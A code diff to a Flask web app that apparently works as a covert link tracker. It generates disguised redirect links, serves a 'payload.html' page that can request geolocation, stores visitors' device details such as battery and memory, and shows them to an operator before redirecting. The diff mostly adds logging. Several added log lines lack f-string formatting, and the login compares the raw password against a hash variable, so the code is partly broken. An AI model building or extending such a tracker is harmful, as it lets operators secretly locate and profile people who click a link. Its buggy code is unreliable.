@@ -155,28 +155,30 @@ def statistics():
             session['attempts'] = 0
 
         if session['attempts'] >= 3:
+            logging.critical(f"3 failed attempts at the password where made by {request.remote_addr}")
             return render_template("login.html", error="Too many failed attempts you have been locked out.")
 
         # Check if the password matches
         password = request.form.get('password')
         if password != clients_password_hash:
             session['attempts'] += 1  # Increment the attempts counter
-
+            logging.warning("Failed password attempt made by {request.remote_addr}")
             return render_template("login.html", error=f"Incorrect password.")
 
         # Reset attempts on successful authentication
         session['authenticated'] = True
         session.pop('attempts', None)  # Clear attempts on success
+        logging.info("Successful login attempt from {request.remote_addr}")
         return redirect("/statistics")  # Redirect to the same route
 
     # Fetch user information from the database if authenticated
     if session.get('authenticated'):
+        link_map = get_all_links(db_path)
+        if link_map:
+            link_map.reverse()
+
         with sqlite3.connect(db_path) as conn:
             cursor = conn.cursor()
-            link_map = get_all_links(db_path)
-            if link_map:
-                link_map.reverse()
-
             cursor.execute("SELECT * FROM user_info")  # Fetch all records
             user_info_records = cursor.fetchall()
 
@@ -229,7 +231,7 @@ def statistics():
                 "device_memory": record[42],
                 "battery_status": record[43],
                 "effective_type": record[44],
-                "timestamp": record[45],  # Note: Make sure to adjust if your query doesn't return all columns
+                "timestamp": record[45],
             })
 
         return render_template("statistics.html", user_info=user_info_list, link_map=link_map)
@@ -242,7 +244,7 @@ def statistics():
 def clear_database():
     # Make sure user is authenticated
     if not session.get('authenticated'):
-        logging.error(f"Unauthenticated request to clear database from {request.remote_addr}")
+        logging.critical(f"Unauthenticated request to clear database from {request.remote_addr}")
         return jsonify({"status": "error", "message": "Unauthorized access"}), 403
 
     # Remove everthing from the database
@@ -256,14 +258,14 @@ def clear_database():
         return jsonify({"status": "success", "message": "Database cleared."}), 200
     except Exception as e:
         logging.error(f"Error clearing database: {str(e)}")
-        return jsonify({"status": "error", "message": "Error clearing database."}), 500
+        return jsonify({"status": "error", "message": "Unexpected error."}), 500
 
 
 @app.route("/delete-link", methods=["POST"])
 def delete_link():
     # Make sure user is authenticated
     if not session.get('authenticated'):
-        logging.error(f"Unauthenticated request to clear database from {request.remote_addr}")
+        logging.critical(f"Unauthenticated request to remove link from database from {request.remote_addr}")
         return jsonify({"status": "error", "message": "Unauthorized access"}), 403
 
     data = request.json
@@ -291,7 +293,7 @@ def delete_link():
 def generate_link():
     # Make sure user is authenticated
     if not session.get('authenticated'):
-        logging.error(f"Unauthenticated request to generate link from {request.remote_addr}")
+        logging.warning(f"Unauthenticated request to generate link from {request.remote_addr}")
         return jsonify({"status": "error", "message": "Unauthorized access"}), 403
 
     data = request.json
@@ -300,6 +302,7 @@ def generate_link():
     try:
         validated_data = schema.load(data)
     except ValidationError as e:
+        logging.error("Incorrect link schema from {request.remote_addr} Data: {data}")
         return jsonify({"status": "error", "message": "Incorrect schema"}), 400
     try:
         insert_link(db_path, validated_data["generatedLink"], validated_data["redirectUrl"], validated_data["gpsEnabled"])
@@ -317,13 +320,14 @@ def user_info(path):
 
     url = request.url
     link_data = get_link_by_url(db_path, url)
-
     # Log the clients information with in index page that loads the javascript
     if request.method == "GET":
+        logging.info(f"New request from {request.remote_addr} URL: {url}")
         if link_data:
             generated_link, redirect_link, gps_enabled = link_data
             return render_template('payload.html', attempt_geolocation=gps_enabled)
 
+        logging.error("Wasnt able to find url in the database URL: {url}")
         return render_template('payload.html', attempt_geolocation=0)
 
     user_data = request.json
@@ -335,6 +339,7 @@ def user_info(path):
     try:
         validated_data = schema.load(user_data)
     except ValidationError:
+        logging.error(f"Incorrect schema for user data from {request.remote_addr} Data: {user_data}")
         return jsonify({"status": "error", "message": "Incorrect schema"}), 400
 
     # Start new thread to processes the data and insert it into the database
@@ -343,8 +348,10 @@ def user_info(path):
 
     if link_data:
         generated_link, redirect_link, gps_enabled = link_data
+        logging.info("Redirecting {request.remote_addr} to {redirect_link}")
         return jsonify({"status": "success", "redirect": redirect_link, "attempt_geolocation": gps_enabled})
 
+    logging.error("Wasnt able to find redirect url in the database URL: {url}")
     return jsonify({"status": "success", "redirect": "https://localhost"})
 
 
